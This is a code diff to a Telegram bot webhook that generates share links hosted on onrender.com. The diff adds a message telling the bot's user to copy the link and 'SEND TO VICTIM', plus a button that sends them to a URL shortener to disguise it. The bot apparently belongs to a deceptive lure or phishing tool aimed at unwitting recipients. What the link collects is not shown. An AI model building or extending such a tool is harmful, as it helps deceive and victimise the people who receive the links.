@@ -400,6 +400,13 @@ def webhook():
                         "text": "Join channel first!",
                         "show_alert": True
                     })
+            elif data_str == "shorten_url":
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
+                    "callback_query_id": cb_id,
+                    "text": "🔗 Opening short-link.me...",
+                    "show_alert": False,
+                    "url": "https://short-link.me"
+                })
             return jsonify({"status": "ok"}), 200
 
         if 'message' not in data:
@@ -478,7 +485,25 @@ def webhook():
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{short_code}"
 
-                # Two buttons: OPEN LINK (url) and SHORTEN URL (callback)
+                # Message with copy code format + buttons
+                message_text = f"""<b>🔐 YOUR SECURE SHARE LINK IS READY!</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+<b>📋 1. COPY THIS LINK & SEND TO VICTIM:</b>
+
+<code>{link}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+<b>📋 2. COPY LINK & SHORTEN URL:</b>
+
+<code>{link}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+<b>👇 CHOOSE AN OPTION BELOW:</b>"""
+
                 markup = {
                     "inline_keyboard": [
                         [
@@ -487,7 +512,7 @@ def webhook():
                         ]
                     ]
                 }
-                send_message(uid, f"✅ Your secure share link is ready!\n\nChoose an option below:", reply_markup=markup)
+                send_message(uid, message_text, reply_markup=markup)
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
